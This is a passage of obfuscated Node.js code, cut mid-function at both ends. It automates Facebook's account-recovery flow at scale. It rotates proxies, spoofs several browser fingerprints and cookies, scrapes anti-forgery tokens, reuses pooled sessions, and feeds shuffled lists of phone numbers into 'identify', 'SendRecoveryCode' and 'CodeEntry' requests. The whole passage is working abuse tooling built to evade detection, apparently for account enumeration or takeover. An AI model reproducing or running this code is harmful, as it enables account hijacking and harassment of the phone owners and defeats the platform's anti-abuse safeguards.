          'location': v608.headers.location || null,
          'encoding': v614 || null,
          'headers': v608.headers
        });
      });
    });
    v606.on("error", v618 => {
      v602(v618);
    }), v606.on("timeout", () => {
      v606.destroy(), v602(new Error("timeout"));
    });
    v604 && (trackBytes(v604.length), v606.write(v604));
    v606.end();
  });
}
async function proxyHttpsRequest(v619, v620, v621, v622 = 0x3a98) {
  return proxyHttpsRequestSingle(v619, v620, v621, v622);
}
function ask(v623) {
  const v624 = {};
  v624.input = process.stdin;
  v624.output = process.stdout;
  const v625 = readline.createInterface(v624);
  return new Promise(v626 => {
    v625.question(v623, v627 => {
      v625.close();
      v626(v627.trim());
    });
  });
}
function getPageGetHeaders(v628, v629, v630, v631, v632) {
  const v633 = v630?.["browserType"] === "firefox" || v630?.["browserType"] === "firefox_linux" || SELECTED_BROWSER === "firefox",
    v634 = v632 || "https://" + v628 + "/login/identify/";
  if (v633) {
    const v636 = {};
    v636["User-Agent"] = v630.userAgent, v636.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", v636["Accept-Language"] = v631 || "en-US,en;q=0.9", v636["Accept-Encoding"] = "gzip, deflate, br", v636.Referer = v634, v636["Upgrade-Insecure-Requests"] = '1', v636.Connection = "keep-alive", v636["Alt-Used"] = v628, v636["Sec-Fetch-Dest"] = "document", v636["Sec-Fetch-Mode"] = "navigate", v636["Sec-Fetch-Site"] = "same-origin", v636["Sec-Fetch-User"] = '?1', v636.Priority = "u=0, i", v636.TE = "trailers";
    const v637 = v636;
    if (v629) v637.Cookie = v629;
    return v637;
  }
  const v635 = {
    'User-Agent': v630.userAgent,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    'Accept-Language': v631 || "en-US,en;q=0.9",
    'Accept-Encoding': "gzip, deflate, br",
    'Referer': v634,
    'Upgrade-Insecure-Requests': '1',
    'connection': "keep-alive",
    ...v630.clientHints,
    'sec-fetch-dest': "document",
    'sec-fetch-mode': "navigate",
    'sec-fetch-site': "same-origin",
    'sec-fetch-user': '?1'
  };
  if (v629) v635.Cookie = v629;
  return v635;
}
function httpsGetPage(v638, v639, v640 = 0x3a98, v641 = null, v642 = undefined, v643 = null) {
  const v644 = v641 || FB_HOST,
    v645 = v642 === undefined ? getProxy() : v642,
    v646 = v643 || globalUA;
  const v647 = v643 && v643.hostCtx ? v643.hostCtx.lang : "en-US,en;q=0.9";
  const v648 = getPageGetHeaders(v644, v639, v646, v647, "https://" + v644 + "/login/identify/");
  if (v645) {
    const v649 = {};
    return v649.hostname = v644, v649.path = v638, v649.method = "GET", v649.headers = v648, proxyHttpsRequest(v645, v649, null, v640).then(v650 => {
      if (v650.status >= 0x12c && v650.status < 0x190 && v650.location) {
        let v652 = v650.location;
        if (v652.startsWith('/')) return httpsGetPage(v652, v639, v640, v644, v645, v646);
        try {
          const v654 = new URL(v652);
          if (v654.hostname.includes("facebook.com")) return httpsGetPage(v654.pathname + v654.search, v639, v640, v654.hostname, v645, v646);
        } catch (v655) {}
        const v653 = {};
        return v653.status = v650.status, v653.redirect = v652, v653.headers = v650.headers || {}, v653;
      }
      const v651 = {};
      v651.status = v650.status;
      v651.data = v650.data;
      return v651.headers = v650.headers || {}, v651;
    });
  }
  return new Promise((v656, v657) => {
    const v658 = {};
    v658.keepAlive = false;
    const v659 = {
      'hostname': v644,
      'port': 0x1bb,
      'path': v638,
      'method': "GET",
      'timeout': v640,
      'agent': new https.Agent(v658),
      'headers': v648
    };
    const v660 = https.request(v659, v661 => {
      if (v661.statusCode >= 0x12c && v661.statusCode < 0x190 && v661.headers.location) {
        let v663 = v661.headers.location;
        v661.resume();
        if (v663.startsWith('/')) return httpsGetPage(v663, v639, v640, v644, v642, v646).then(v656).catch(v657);
        try {
          const v665 = new URL(v663);
          if (v665.hostname.includes("facebook.com")) return httpsGetPage(v665.pathname + v665.search, v639, v640, v665.hostname, v642, v646).then(v656).catch(v657);
        } catch (v666) {}
        const v664 = {};
        return v664.status = v661.statusCode, v664.redirect = v663, v656(v664);
      }
      const v662 = [];
      v661.on("data", v667 => v662.push(v667));
      v661.on("error", v668 => {
        try {
          v657(v668);
        } catch (v669) {}
      }), v661.on("end", () => {
        let v670 = Buffer.concat(v662);
        if (v661.headers["content-encoding"] === "gzip") try {
          v670 = zlib.gunzipSync(v670);
        } catch (v671) {} else {
          if (v661.headers["content-encoding"] === "deflate") try {
            v670 = zlib.inflateSync(v670);
          } catch (v672) {} else {
            if (v661.headers["content-encoding"] === 'br') try {
              v670 = zlib.brotliDecompressSync(v670);
            } catch (v673) {}
          }
        }
        v656({
          'status': v661.statusCode,
          'data': v670.toString(),
          'headers': v661.headers
        });
      });
    });
    v660.on("error", v657), v660.on("timeout", () => {
      v660.destroy();
      v657(new Error("timeout"));
    });
    v660.end();
  });
}
function graphqlPost(v674, v675, v676 = 0x3a98, v677 = undefined, v678 = "www.facebook.com") {
  const v679 = v677 === undefined ? getProxy() : v677,
    v680 = v678 || "www.facebook.com";
  if (v679) {
    const v681 = {
        ...v675
      },
      v682 = {};
    return v682.hostname = v680, v682.path = "/api/graphql/", v682.method = "POST", v682.headers = v681, proxyHttpsRequest(v679, v682, v674.toString(), v676);
  }
  return new Promise((v683, v684) => {
    const v685 = v674.toString(),
      v686 = {};
    v686.keepAlive = false;
    const v687 = {
        'hostname': v680,
        'port': 0x1bb,
        'path': "/api/graphql/",
        'method': "POST",
        'headers': {
          ...v675,
          'Content-Length': Buffer.byteLength(v685),
          'Accept-Encoding': "gzip, deflate, br"
        },
        'timeout': v676,
        'agent': new https.Agent(v686)
      },
      v688 = https.request(v687, v689 => {
        const v690 = [];
        v689.on("data", v691 => {
          v690.push(v691);
          trackBytes(v691.length);
        });
        v689.on("error", v692 => {
          try {
            v684(v692);
          } catch (v693) {}
        }), v689.on("end", () => {
          let v694 = Buffer.concat(v690);
          const v695 = v689.headers["content-encoding"];
          if (v695 === "gzip") try {
            v694 = zlib.gunzipSync(v694);
          } catch (v696) {} else {
            if (v695 === "deflate") try {
              v694 = zlib.inflateSync(v694);
            } catch (v697) {} else {
              if (v695 === 'br') try {
                v694 = zlib.brotliDecompressSync(v694);
              } catch (v698) {}
            }
          }
          v683({
            'status': v689.statusCode,
            'data': v694.toString(),
            'headers': v689.headers
          });
        });
      });
    v688.on("error", v684), v688.on("timeout", () => {
      v688.destroy(), v684(new Error("timeout"));
    }), trackBytes(v685.length), v688.write(v685);
    v688.end();
  });
}
async function seedSession(v699 = null, v700 = null, v701 = null, v702 = () => {}) {
  return new Promise((v703, v704) => {
    const v705 = v700 || globalUA;
    const v706 = v699 === undefined ? proxyManager.hasProxies ? proxyManager.getNext() : null : v699,
      v707 = v701 || {
        'host': SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : "www.facebook.com",
        'locale': "en_US",
        'lang': "en-US,en;q=0.9"
      };
    if (v706) {
      const v708 = SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : v707.host,
        fn14 = (v709, v710, v711) => {
          proxyHttpsRequest(v706, {
            'hostname': v709,
            'path': v710,
            'method': "GET",
            'headers': getPageGetHeaders(v709, null, v705, v707.lang, "https://" + v709 + "/login/identify/")
          }, null, 0x3a98).then(v712 => {
            if ((v712.status === 0x12d || v712.status === 0x12e) && v712.location && v711 > 0x0) {
              let v713 = v709,
                v714 = v712.location;
              if (v712.location.startsWith("http")) try {
                const v715 = new URL(v712.location);
                v713 = v715.hostname, v714 = v715.pathname + v715.search;
              } catch (v716) {}
              fn14(v713, v714, v711 - 0x1);
            } else v707.host = v709, fn13(v712.data, v712.status, v712.headers);
          }).catch(v717 => {
            if (v717 && v717.code === "ZSTD_ENCODING" && proxyManager.hasProxies) {
              dbg("[SEED] ZSTD proxy " + v706.host + ':' + v706.port + " — rotating and retrying seed");
              const v718 = proxyManager.getNext();
              v718 && v718.host !== v706.host ? seedSession(v718, v700, v701, v702).then(v703).catch(v704) : v704(new Error("All proxies return zstd — cannot seed session"));
            } else v704(v717);
          });
        };
      fn14(v708, "/login/identify/", 0x5);
    } else {
      const v719 = SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "mweb_pixel8" ? "m.facebook.com" : v707.host,
        fn15 = (v720, v721, v722) => {
          const v723 = {
              'hostname': v720,
              'port': 0x1bb,
              'path': v721,
              'method': "GET",
              'headers': getPageGetHeaders(v720, null, v705, v707.lang, "https://" + v720 + "/login/identify/"),
              'timeout': 0x3a98
            },
            v724 = https.request(v723, v725 => {
              if ((v725.statusCode === 0x12d || v725.statusCode === 0x12e) && v725.headers.location && v722 > 0x0) {
                v725.resume();
                let v726 = v720,
                  v727 = v725.headers.location;
                if (v725.headers.location.startsWith("http")) try {
                  const v728 = new URL(v725.headers.location);
                  v726 = v728.hostname, v727 = v728.pathname + v728.search;
                } catch (v729) {}
                fn15(v726, v727, v722 - 0x1);
              } else {
                const v730 = [];
                v725.on("data", v731 => v730.push(v731)), v725.on("error", v732 => {
                  try {
                    v704(v732);
                  } catch (v733) {}
                }), v725.on("end", () => {
                  let v734 = Buffer.concat(v730);
                  const v735 = v725.headers["content-encoding"];
                  if (v735 === "gzip") try {
                    v734 = zlib.gunzipSync(v734);
                  } catch (v736) {} else {
                    if (v735 === "deflate") try {
                      v734 = zlib.inflateSync(v734);
                    } catch (v737) {} else {
                      if (v735 === 'br') try {
                        v734 = zlib.brotliDecompressSync(v734);
                      } catch (v738) {}
                    }
                  }
                  v707.host = v720, fn13(v734.toString(), v725.statusCode, v725.headers);
                });
              }
            });
          v724.on("timeout", () => {
            v724.destroy();
            v704(new Error("Timeout seeding session"));
          });
          v724.on("error", v739 => {
            v704(v739);
          });
          v724.end();
        };
      fn15(v719, "/login/identify/", 0x5);
    }
    function fn13(v740, v741, v742 = {}) {
      if (v741 !== 0xc8) {
        v704(new Error("Session seed HTTP " + v741));
        return;
      }
      if (v740 && v740.length > 0x0 && v740.charCodeAt(0x0) < 0x20 && v740.charCodeAt(0x0) !== 0xa && v740.charCodeAt(0x0) !== 0xd) {
        dbg("[SEED] Binary/undecoded response body (first byte 0x" + v740.charCodeAt(0x0).toString(0x10) + ") — possible zstd from proxy. Rejecting."), v704(new Error("BINARY_BODY"));
        return;
      }
      const v743 = {},
        v744 = v742["set-cookie"] || v742["Set-Cookie"];
      if (v744) {
        const v748 = Array.isArray(v744) ? v744 : [v744];
        v748.forEach(v749 => {
          const v750 = v749.split(';')[0x0].split('=');
          if (v750.length >= 0x2) {
            const v751 = v750[0x0].trim(),
              v752 = v750.slice(0x1).join('=').trim();
            v743[v751] = v752;
          }
        });
      }
      SELECTED_BROWSER === "via_browser" && (v743.m_pixel_ratio = "2.625", v743.wd = "412x732");
      if (SELECTED_BROWSER === "mweb_pixel8") {
        const v753 = {};
        v753.w = 0x19c, v753.h = 0x393, v753.dpr = 2.625;
        const v754 = v705 && v705.hw ? v705.hw : v753;
        v743.m_pixel_ratio = String(v754.dpr), v743.wd = v754.w + 'x' + v754.h, v743.dpr = String(v754.dpr), v743.ps_l = '1', v743.ps_n = '1';
      }
      (SELECTED_BROWSER === "duckduckgo" || v705?.["browserType"] === "duckduckgo") && (v743.wd = "1920x941", v743.ps_l = '1', v743.ps_n = '1');
      (SELECTED_BROWSER === "firefox" || v705?.["browserType"] === "firefox" || v705?.["browserType"] === "firefox_linux") && (v743.wd = "1420x919");
      if (v740 && v740.includes("datr")) {
        const v755 = v740.match(/"datr":"([^"]+)"/);
        if (v755) v743.datr = v755[0x1];
      }
      !v743.datr && (v743.datr = Math.random().toString(0x24).substring(0x2, 0xf) + Math.random().toString(0x24).substring(0x2, 0xf));
      const fn16 = v756 => {
          const v757 = v740.match(v756);
          return v757 ? v757[0x1] : '';
        },
        v745 = {};
      v745.lsd = fn16(/"LSD",\[\],\{"token":"([^"]+)"/) || fn16(/name="lsd"\s+value="([^"]+)"/) || fn16(/"token":"([^"]+)"/) || fn16(/\"lsd\":\{\"token\":\"([^"]+)\"/);
      v745.hsi = fn16(/"hsi":"(\d+)"/) || fn16(/"hsi":(\d+)/) || String(Math.floor(Date.now())), v745.rev = fn16(/"server_revision":(\d+)/) || "1047458801", v745.fb_dtsg = fn16(/"dtsg":\{"token":"([^"]+)"/) || fn16(/name="fb_dtsg" value="([^"]+)"/) || '', v745.spinB = fn16(/"__spin_b":"([^"]+)"/) || "trunk", v745.spinT = fn16(/"__spin_t":(\d+)/) || String(Math.floor(Date.now() / 0x3e8)), v745.__hs = fn16(/"__hs":"([^"]+)"/) || "20710.HYP:comet_loggedout_pkg.2.1...0", v745.__comet_req = fn16(/"__comet_req":(\d+)/) || '15', v745.__ccg = fn16(/"__ccg":"([^"]+)"/) || "EXCELLENT", v745.__dyn = fn16(/"__dyn":"([^"]+)"/) || '', v745.__csr = fn16(/"__csr":"([^"]+)"/) || '', v745.hsi = v745.hsi || fn16(/"hsi":(\d+)/) || '0', v745.__s = fn16(/"__s":"([^"]+)"/) || fn16(/"session_id":"([^"]+)"/) || '', v745.initialCipher = fn16(/"cipher_text"\s*:\s*"([^"]+)"/) || fn16(/\\"cipher_text\\"\s*:\s*\\"([^"\\]+)\\"/) || fn16(/"cipher"\s*:\s*"([^"]+)"/) || fn16(/\\"cipher\\"\s*:\s*\\"([^"\\]+)\\"/) || fn16(/"ci":"([^"]+)"/) || fn16(/[?&]ci=([A-Za-z0-9_\-]+)/) || fn16(/(Ad[A-Za-z0-9_\-]{50,})/) || '';
      v745.contextData = fn16(/"context_data"\s*:\s*"([^"]+)"/) || fn16(/context_data\\":\\"([^"\\]+)\\"/) || fn16(/(Ad[A-Za-z0-9_\-]{40,}\|arm)/) || '', v745.__hsdp = fn16(/"__hsdp":"([^"]+)"/) || '', v745.__hblp = fn16(/"__hblp":"([^"]+)"/) || '', v745.__sjsp = fn16(/"__sjsp":"([^"]+)"/) || '', dbg("[SESSION] lsd=" + (v745.lsd ? '✓' : '✗') + " rev=" + v745.rev + " hs=" + v745.__hs + " dtsg=" + (v745.fb_dtsg ? '✓' : '✗') + " ctxData=" + (v745.contextData ? '✓' : '✗'));
      if (!v745.lsd) {
        v704(new Error("Failed to initialize session"));
        return;
      }
      let v746 = 0x0;
      const v747 = v745.lsd || '';
      for (let v758 = 0x0; v758 < v747.length; v758++) v746 += v747.charCodeAt(v758);
      v703({
        ...v745,
        'jazoest': '2' + v746,
        'cookies': v743,
        'cookieHeader': Object.entries(v743).map(([v759, v760]) => v759 + '=' + v760).join(';\x20'),
        'hostCtx': v707,
        'uaData': v705
      });
    }
  });
}
const sessionPool = new Map(),
  SESSION_TTL_MS = 120000;
function getProxyCacheKey(v761, v762, v763) {
  const v764 = v761 ? v761.type + "://" + v761.host + ':' + v761.port : "direct",
    v765 = v762 ? !!v762.isMobile : SELECTED_BROWSER === "ios" || SELECTED_BROWSER === "android" || SELECTED_BROWSER === "samsung" || SELECTED_BROWSER === "mweb_pixel8" || SELECTED_BROWSER === "via_browser" || SELECTED_BROWSER === "random_mobile" || SELECTED_BROWSER.includes("mobile"),
    v766 = v765 ? "mobile" : "desktop";
  const v767 = v763 && v763.host || "www.facebook.com";
  return v764 + '|' + v766 + '|' + v767;
}
function invalidateSessionCache(v768, v769, v770) {
  const v771 = getProxyCacheKey(v768, v769, v770);
  sessionPool.delete(v771);
}
async function getOrSeedSession(v772 = null, v773 = null, v774 = null, v775 = () => {}) {
  const v776 = getProxyCacheKey(v772, v773, v774),
    v777 = sessionPool.get(v776),
    v778 = Date.now();
  if (v777 && v778 - v777.createdAt < SESSION_TTL_MS && v777.uses < 0x3) {
    v777.uses++;
    const fn17 = () => Math.random().toString(0x24).slice(0x2, 0x9),
      v781 = fn17() + ':' + fn17() + ':' + fn17(),
      v782 = Object.assign({}, v777.session.cookies),
      v783 = {
        ...v777.session
      };
    v783.cookies = v782, v783.__s = v781, v783.__s_code = null, v783.__req = (v777.session.__req || 0xa) + v777.uses * 0x3;
    const v784 = v783;
    return v784.cookieHeader = Object.entries(v784.cookies).map(([v785, v786]) => v785 + '=' + v786).join(';\x20'), dbg("[SESSION POOL] Reusing warm session (" + v777.uses + '/' + 0x3 + ", age " + Math.round((v778 - v777.createdAt) / 0x3e8) + "s) __s=" + v781), v784;
  }
  const v779 = await seedSession(v772, v773, v774, v775),
    v780 = {};
  v780.session = v779, v780.createdAt = v778;
  v780.uses = 0x1;
  return sessionPool.set(v776, v780), v779;
}
function loadNumbers(v787) {
  (!v787 || !fs.existsSync(v787)) && process.exit(0x1);
  const v788 = fs.readFileSync(v787, "utf8").split(/\r?\n/).map(v789 => v789.trim()).filter(v790 => v790 && /^\+?\d{7,15}$/.test(v790));
  for (let v791 = v788.length - 0x1; v791 > 0x0; v791--) {
    const v792 = Math.floor(Math.random() * (v791 + 0x1));
    [v788[v791], v788[v792]] = [v788[v792], v788[v791]];
  }
  return v788;
}
function buildParams(v793, v794, v795, v796, v797, v798, v799 = null) {
  const v800 = v799 && v799.includes("CodeEntry"),
    v801 = v799 && v799.includes("InitiateView") || v795 && (v795.includes("InitiateView") || v795.includes("SendRecoveryCode")),
    v802 = "gdxgCxLgs8Bf3jwc5w5ww8aEgU5IE",
    v803 = "gLLskXaWLLJdmyaNa5kAOl48gytcJiGnJGXmEyXAVa8BV4VpfHCXAbAUHQHBla8JbGmxlvsBbKAhkDbOaQ_tjuBlcBkBQiFamq9-9yoCmbBz5GGG6Q9x67tk-GAypubx3Q9UDtCyoy4pF22VEDzAiiaDUQxQdwGzozCz9o8UtCaaG4p8-byp89VWybpEOfwR7WbRuy9mIOcmFtRq8shjrNZVbp6wG9yq9Nn2ribrGQq8wGXgiWChp2m4p4aK5ayAi8x2qt9SeESFWghXQuytRDB8qDQi-L-OiN911G4m8xa4q-yha6nkGfascFf49y6W8CSlbCJ8V2d4aqFGhTKYP6Ixr4hsagReID6PhW9kA5Ihcg2vb3A9shkU1DA0wo6esC68tgaobE-9Ugg3383O1-V4tfyA2u9wGouxy0P82hyBxA85g9ooBrK8wwyobokjGA3wc2VjaWGrE9UJ6ADxF34WZaLUJVEKFeii4EC8WDGcyvy8GzAy5e0oi0wbQ-1qwyiRwBCzuQUyqeAzdS2umEO4ax2ewnE8rws8XZqzk3W1lK487qFu1JwdG1CwSwmt0ee4Aq1q6WoxgWFoPBjAhUV1y2p3NE88-gIB3ah39O5AAhSNagByqS9ABbpi1bmBUW0UCip3VIhU9U5i0w80xWdQy08u2y8w5HP04vw-xJ0Kxu8CcFogwJgC3umdhawFovaF87uu2S4A2O1Xxa3C2Wi1Pw38o46Cu8g19Cgv5BwyxatMg3UQ9Mn04phFreCh7CxOxAqu76JiV8Lxl4G6Eoc9zPwHqxqmfAohRgxzaDVHDgK1Hz82jA4EEKb-kBeq4EC6-dAh8tF4GcDqUgz82Xz31q0ize853oiqYzbuuEAIxfDnxKE8uKG_n3M2SwlWg6m0sO0N83JAw4aw2ppQ0vuK5pjwd-p6w4Fwvo3Yw9K0Sqw0ypylG9w5AxG0aDDw0CJw1tXm0eHzE2dwcZ1aq13UJ683zgC4kBujqgfUrwWo62asiEit3bh8-Unw4UK7pUbVLg3Ma0HS0mR04hK4qx69V8BxbQ7VEy2K4XHDwNJ6Uc22Gy8lzmqdAyBgO6olxacw8qm5V8K0ZU4y0lS1hy8wyg1xe2K0j612U6W0jt1K5E94562q0Ho24w-wbB164Eiyqwzw4Dz83gwm8cyF6SuEC365-p5ZbAxmHzGxn3akdG3F39ci7MggU1uBe0wU2fEM6q0FUdBeEbU2rwBJ2Q0SpO0dK2H8nUgIF8doDih8yCBxB7yokyE6G1wU1282ANwvwbm0-C1lIllG0LEwJQ581ii0aU0k080ad07Cw47wOCCo23K0W85G0rZ6g93yXAhZ2Hwio4O0E4WdBmmCiGBa0X8G5E4y2e4Epxi1jwko9EmxB0v8869x5yQK0jDxZ3A9AwSwZx2tw9Yw461fU5u3Wawuk1xwhk79nwQx-qi3eFXyW5UpzAEsguS3u0Cqx8g8G-uh0Ax-3a2ecwtFUaEqw126i1SgkwiE1roJ0eBxu1vz8N3Vmi0I8tBxO0B40OUaUvwKxG1OFe4Ui8bG3m88ewwK4izU8O90NDByFagx3BQl0UFrA80Eo6y7ohau48uw74w5lw4Wg0lHDy1jyJ3UO0mK1Jw25NQkm3F0XUpg0ksw7zo2ww238c8y2qsU1soC1p80ou0DEao1kU2hw4Tw5f7y133gt24k0-o33K1dyx8228ahp823o1zoK14xii1oUqy0fcf1M7Hx4U2ZgtAxSfAw96dxA1WxG3imq7cNUNgU3Rg3Owd60iK1cgnwZweevwOz6ueyahC4ucUGayA5IoEshEnO4CgqByUaUS1Ix-ak1VEpMmyQ41YEw3QE2Y85oKcwdW0H8452U5S0Fg0Z0",
    v804 = "gdxghixIykYdQUsgAEuydNw5xwJKOyz0uEb8dUlG7o7J5FebWOMuA2EI2o64h0nEb8aUW3G0si0MUaaKQ8w9lk9g4B2U7e14Fw2G82jweu0XE10o5R07kx93Ua8W0ipu582ZBxu4AaxO7Ekge8yfw34UG1VU6V09608nwqo0I60O8a83DwIwtk1xw9yawkVo0O2U2PwnU2ew4bwmEdE4y1BwgFo0DK1xw",
    v805 = "3E2awTzE1481Drzo5V09G1Dwto3swxwno6uq0L8aaKQ8w4XwPwgbFwm84y2G1kw9i11Cwgo564Q2G4ESu3-fw86u68-2i320y82mhUao6S48pwNg5-uudxa6E52ayk2q8w964AdUqyrwRwkQ1twVx9eESVUxe485x1im26m2F0Dz8ggkg9u0pK320_Ueo46ui1IUbo410964E661_wo8562t0RByE-m1hU7S2y2G3iexevg-5EW3uawOwSx-4oaonwzGeDwhK5E5Gm1lwDwzxqq1SCzU52ahqhoowIwMwDAwWCzEG1jBgeSeVFEy7UcE4m1LzUnwp8G78dayo2VKi79Elwdjw8O0D8boO4Qdy88o2lzoqxq48C3m5Km2emi2im6awAAwwg463i2e1dwk8boeo56",
    v806 = "gdxghixIykYdQUsgAEuydNw5xwJKOyz0uEb8dUlG7o7J5FebWOMuA2EI2o64h7wlEb8aUWfwGwrQ0le0MUaaKQ8w9lk9g4B2U7e14Fw2G82jweu0XE10o5R07kx93Ua8W0ipu582ZBxu4AaxO7Ekge8yfw34UG1VU6V09608nwqo0I60O8a83DwIwtk1xw9yawkVo0O2U2PwnU2ew4bwmEdE4y1BwgFo0DK1xw",
    v807 = "3E2awTzE1481Drzo5V09G1DwiEaE6-1Iwxwno6uq0L8aaKQ8w4XwPwgbFwm84y2G1kw9i11Cwgo564Q2G4ESu3-fw86u68-2i320y82mhUao6S48pwNg5-uudxa6E52ayk2q8w964AdUqyrwRwkQ1twVx9eESVUxe485x1im26m2F0Dz8ggkg9u0pK320_Ueo46ui1IUbo410964E661_wo8562t0RByE-m1hU7S2y2G3iexevg-5EW3uawOwSx-4oaonwzGeDwhK5E5Gm1lwDwzxqq1SCzU52ahqhoowIwMwDAwWCzEG1jBgeSeVFEy7UcE4m1LzUnwp8G78dayo2VKi79Elwdjw8O0D8boO4Qdy88o2lzoqxq48C3m5Km2emi2im6awAAwwg463i2e1dwk8boeo56",
    v808 = v793?.["uaData"]?.["browserType"] === "duckduckgo" || v793?.["browserType"] === "duckduckgo" || SELECTED_BROWSER === "duckduckgo";
  let v809, v810, v811;
  if (v800) v809 = v793.__dyn_code || v793.__dyn || "7xeUjG4E4e5U5ObwyyVp4UnxG2q1DxiFGxK7oG1-zEdF8iBxa361MwFwJzUS8xe1Bw8i7oqx611wno2wgaU7i2qq1eCyUhxR162-8G6kE8Ro4uUfo2lxF122yfBwWxecAwXwEwgonzoO0AE2qwgEhwGxu786a6oowv89k2CcAwOwAwgk6U-3K5E7VxK48W7p8hjwGK2efK1YwCxe68hzE2ZwzyrwmEiwm8kzu5o4qu1dwkVokylK2W1RwrUO4ohz8ek9zo8U5e3C1jhU2Rwhoapococp8C221bxC2q2SUtyo6O2G2V3AfwOG499U9oO2LwxK1nBG2O7ESm13g3yxC11xS3S1EyUd8-2m2BxacxG1dwiE6e9Dxy1iGEdUb8-5XK5oLwSzp8", v810 = v793.__csr_code || v793.__csr || "gLLskXaWLLJdmyaNa5kAOl48gytcJiGnJGXmEyXAVa8BV4VpfHCXAbAUHQHBla8JbGmxlvsBbKAhkDbOaQ_tjuBlcBkBQiFamq9-vKm9ByVoNqGGyEggC4okLHlfnhbLBUK4fgDytSq9y8hCA8bCyueh98Gvzi7gS2GdyeqcBwzxSoEGEhAzUK9AwDDG8JCz8-3kvELlW8BqP8NqBTlExN5dL7TAJAq2EC9ED5s9J8JKHhEy2HJ1bGp5A9ohAgGUkGah8y49FQDoWzqDF17LhW9TmukxGvhbW_X9b4A46Ehoy4EhHW94EptiEYFMOAYgC8rEyrpkKqQzA8QgFGCF7uXPcqO5Ih5MF3kWOsrd7EBigmN4N09YIegBN5jw6ug21woVOooxR0FwKzUDx10ccwf87XAhQ-ag9UC2FxW683cw96am6gwl0BxylKUy229wJxheGge0MbBcHGFKwDyQqiu6AcjHQG_yTCyWAV98iyozGuEO9-8yGei8kU1x820LjU5G29bm2mqdXjy9EWicTo9Vqz8gG48W1uwxK1MzLRGdgfE5mUgwtGBU6S0SE6q3q1pQ0UUihE5ErFy53GBzeleh7zA689Af6wwzV2OkcF4cD8mih7r4F2m9HoCikJB84JqnzE3yp9AfCN7wDwl820w27ETi80xUa8y0mLc0h-3W6Q2W5UyoOBx22R2odVoR4G2BxYGAwtVUboigb87K4EeobF87e0cxwgqpUx04Cp1Ymm2a4FT10fzgD1s0hB6BIWp4uq7a6hFUsqRbAy-5kiEqxwMCfe2JG5Fo-hx7l26cGvCKt2U6Kcw9egiyyULVikVEiyorUSh4xSAiEOtHx2cwbKcc5E1acUwkdx9HOcJVWyiO4-tu6WwxWWHZsf0bq1nF0po1P834weSi0gG09BDg1ZWUlBe0TVAq0iC1ZwfO0CU3pG029C9mEC0mi6E0Guu02qS05TJo0WKew8S0PQ4FE4fyQowed2ohilVdF0_xK3Fwo8FNax9QcJ4zXxu0jyUtDwLCZ0f0E2Lo1rk0h6UhG4oDAym4LgvCy8aUjKKu36QrwM8aG8xmdpESial38pxm4EO0xFonAyU3Twi81no568y29064UaU1co4bwrE1dQ6UmwAgko9E2Jw8i3W0Kk4oixa9G2e0iucwd21owOaArpWyoconVAnQKi5qKeG5scFgSEeAcAN8v113w5WkU23w8-z0pE2DwSkWwLw9K2mQbg3pD80SUaIxvx2OAwRyt94yaqm6ku9xiawqE63w48waj61-0Jo3Wo5mNlmE2-y2Tgkw5980Hw1g0w0EQ0uq0gu3aqpw8eU3EwmE1LQp0AebKh7QaK19wj82wjESlpqpaGkE3IyEmwi88UixC585e1hwCxq6k1YwwoC4mbiU1eu7QegCi3q3S49S0DO0go4_wlUfEG1Vg6615gsBu3i7VF8cWDKbEnxCeixN1XodU2pG4x0yHVV42i7UcE8UO1SDwGxG048p87p1i1aw5JyQ0Wm5U5-cz4fBp82MxSm782kg3bwHx-2W6E7aAUjx8wKEdowwW22Uhafwz8A36umaAF24enhk3yBKgw2xwq8tx4FUgxW0si0lm0jF01mKu85eaQfz81qU6S08n7hhoeA3LxB01hO0udwa208cwMy89FPw5Nyo5Aw1xU2uwFw5jw960ju0kYu84cd1Q8hg3VwceU4Sa4w88wF5Aw8dw6dyU4i5985zxG80YMY70uK4jwbR1Si7o-i0AoS6g7G6Ed9pEsP7z53wfl0fa0Qo1aU4N1u3S0UV-3acpUW8F6ohUPyEGagmNyxN6xv8ip1GmbwHzo6O7UFg7CxD1qbgg7Oy0fiwbMwlyUO0TE2Iwgkbwno2B03Q0", v811 = v793.__s_code || v793.__s || '';else v801 ? (v809 = "7xeUjG4E4e5U5ObwyyVp4UnxG2q1DxiFGxK7oG1-zEdF8iBxa361MwFwJzUS8xe1Bw8i7oqx611wno2wgaU7i2qq1eCyUhxR162-8G6kE8Ro4uUfo2lxF122yfBwWxecAwXwEwgonzoO0AE2qwgEhwGxu786a6oowv89k2CcAwOwAwgk6U-3K5E7VxK48W7p8hjwGK2efK1YwCxe68hzE2ZwzyrwmEiwm8kzu5o4qu1dwkVokylK2W1RwrUO4ohz8ek9zo8U5e3C1jhU2Rwhoapococp8C221bxC2q2SUtyo6O2G2V3AfwOG499U9oO2LwxK1nBG2O7ESm13g3yxC11xS3S1EyUd8-2m2BxacxG1dwiE6e9Dxy1iGEdUb8-5XK5oLwSzp8", v810 = v803, v811 = v793.__s || '') : (v809 = v808 ? "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm83Ywgo0Vy3mdw" : v793.__dyn || "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm83Ywgo0Vy3mdw", v810 = v793.__csr || 